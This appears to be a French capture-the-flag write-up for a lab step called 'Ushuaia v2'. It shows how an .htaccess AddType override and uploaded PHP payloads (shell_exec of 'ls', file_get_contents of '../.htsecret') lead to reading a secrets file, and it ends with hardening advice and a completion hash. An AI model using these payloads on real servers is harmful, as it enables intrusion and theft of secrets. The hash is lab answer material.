# Étape 12 — Ushuaia v2

## Objectif
Lire le fichier `.htsecret`.

## Faille / Catégorie OWASP
**Code Injection**

## Démarche d'exploitation
Même vecteur d'attaque que l'étape 10 (Ushuaia), appliqué à une version légèrement différente du site.

1. Création d'un fichier `.htaccess` contenant :
   ```
   AddType application/x-httpd-php .html
   ```

2. Upload du `.htaccess` dans le répertoire `Docs`

3. Upload d'un fichier `.html` pour lister le répertoire parent :
   ```php
   <?php echo shell_exec('ls -la ../'); ?>
   ```

4. Lecture du fichier `.htsecret` :
   ```php
   <?php echo file_get_contents('../.htsecret'); ?>
   ```

## Recommandations
- Désactiver l'utilisation de fichiers `.htaccess` via `AllowOverride None` sous Apache
- Désactiver la directive `AddType`
- Utiliser une liste blanche des extensions de fichiers autorisées
- Ajouter les fonctions shell dans `disable_functions` dans `php.ini`
- Ajouter un contrôle côté serveur pour valider et échapper les données avant traitement

## Certificat
`92f9a0f5f126254c1285b7ac61a30f0313081b58f4b820a128a8a9d45a4eb1961d2bb5a622425402`
